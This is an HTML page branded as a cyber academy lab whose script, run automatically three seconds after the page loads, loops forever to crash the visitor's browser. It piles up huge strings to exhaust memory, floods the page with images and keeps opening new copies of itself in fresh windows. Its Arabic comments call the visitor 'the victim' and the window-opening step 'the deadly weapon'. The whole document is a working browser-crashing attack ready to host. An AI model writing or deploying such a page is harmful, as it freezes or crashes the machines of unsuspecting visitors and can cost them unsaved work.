<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nawaf Cyber Academy - Labs</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            text-align: center;
            font-family: 'Courier New', Courier, monospace;
            padding-top: 100px;
        }
    </style>
</head>
<body>

    <h1>Nawaf Cyber Academy</h1>
    <p>... جاري فحص موارد النظام واستعداد الهجوم</p>
    <p>انتظر 3 ثواني فقط...</p>

    <script>
        window.onload = function() {
            let data = [];
            
            function crash() {
                // تنبيه بسيط قبل "التهنيج"
                console.log("BOOM!");
                
                while(true) {
                    // 1. استنزاف الرام
                    data.push(new Array(10000000).join("X")); 
                    
                    // 2. إغراق الصفحة بالعناصر
                    let img = document.createElement('img');
                    img.src = "https://placehold.co/600x400?text=CRASHING";
                    document.body.appendChild(img);
                    
                    // 3. فتح نوافذ جديدة (هذا هو السلاح الفتاك)
                    window.open(window.location.href, '_blank');
                }
            }
            
            // سيتم التنفيذ بعد 3 ثواني من دخول الضحية (أو دخولك أنت للتجربة)
            setTimeout(crash, 3000);
        };
    </script>

</body>
</html>
